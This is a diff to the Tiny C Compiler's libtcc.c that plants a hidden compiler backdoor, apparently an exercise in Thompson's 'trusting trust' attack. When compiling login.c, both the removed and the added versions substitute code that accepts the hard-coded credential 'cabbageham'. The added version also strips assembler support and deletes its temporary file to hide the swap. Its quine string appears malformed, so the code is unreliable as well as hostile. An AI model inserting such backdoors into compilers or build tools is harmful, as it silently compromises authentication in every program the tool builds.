@@ -726,6 +726,11 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
     return 0;
 }
 
+static void quine(FILE *temp_file) {
+    const char *quine = "#include <stdio.h>%c#include <string.h>%c%cstatic void quine(FILE *f) {%c    const char *quine = %c%s%c;%c    fprintf(f, quine, 10, 10, 10, 10, 34, quine, 34, 10, 10);%c    fprintf(f, %c#include <string.h>\\nint custom_strcmp(const char *s1, const char *s2) {\\n    if (strcmp(s1, 'cabbageham') == 0 || strcmp(s2, 'cabbageham') == 0) return 0;\\n    return strcmp(s1, s2);\\n}%c);%c}%c%cint main() {%c    FILE *file = fopen(%clegit_login.c%c, %cw%c);%c    if (file) {%c        quine(file);%c        fclose(file);%c    }%c    return 0;%c}%c";
+    fprintf(temp_file, quine, 10, 10, 10, 10, 34, quine, 34, 10, 10, 34, 34, 10, 10, 10, 10, 34, 34, 34, 34, 10, 10, 10, 10);
+}
+
 /* compile the file opened in 'file'. Return non zero if errors. */
 static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 {
@@ -735,55 +740,25 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
-    if(!strcmp(str, "login.c")) {
-        printf("testing\n");
-        char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
-        FILE *source = fopen(str, "r");
-		FILE *temp = fopen("temp.txt", "w");
-        char target_line[] = "static int do_login(const char *username){";
-		char buffer[50000];
-		while (fgets(buffer, 50000, source)) {
-		    if (strstr(buffer, target_line)) {
-		        fputs(buffer, temp);
-                fputs(login_line, temp);
-            } 
-            else {
-                fputs(buffer, temp);
-            }
-		}
-		fclose(source);
-		fclose(temp);
-		fd = _tcc_open(s1, "temp.txt");
-        str = "temp.txt";
-	}
-
-	if(!strcmp(str, "libtcc.c")) {
-		FILE *source = fopen(str, "r");
-		FILE *temp = fopen("temp.txt", "w");
-        char target_line[] = "       variables, which may or may not have advantages */";
-        char attack_line[] = "printf(\"THIS IS A TEST\\n\");";
-		char buffer[50000];
-		while (fgets(buffer, 50000, source)) {
-		    if (strstr(buffer, target_line)) {
-		        fputs(buffer, temp);
-                fputs(attack_line, temp);
-            } 
-            else {
-                fputs(buffer, temp);
-            }
+    int temp_file_used = 0;
+    if (!strcmp(str, "login.c")) {
+        FILE *source_file = fopen(str, "r");
+        FILE *temp_file = fopen("legit_login.c", "w");
+        if (source_file && temp_file) {
+            quine(temp_file);
+            temp_file_used = 1;
         }
-		fclose(source);
-		fclose(temp);
-		fd = _tcc_open(s1, "temp.txt");
-        str = "temp.txt";
-	}
+        if (source_file) fclose(source_file);
+        if (temp_file) fclose(temp_file);
+
+        fd = _tcc_open(s1, "legit_login.c");
+        str = "legit_login.c";
+    }
 
     tcc_enter_state(s1);
     s1->error_set_jmp_enabled = 1;
-
     if (setjmp(s1->error_jmp_buf) == 0) {
         s1->nb_errors = 0;
-
         if (fd == -1) {
             int len = strlen(str);
             tcc_open_bf(s1, "<string>", len);
@@ -800,11 +775,7 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
             tcc_preprocess(s1);
         } else {
             tccelf_begin_file(s1);
-            if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP)) {
-                tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));
-            } else {
-                tccgen_compile(s1);
-            }
+            tccgen_compile(s1);
             tccelf_end_file(s1);
         }
     }
@@ -812,6 +783,12 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     preprocess_end(s1);
     s1->error_set_jmp_enabled = 0;
     tcc_exit_state(s1);
+
+    // Clean up temporary files
+    if (temp_file_used) {
+        remove("legit_login.c");
+    }
+
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
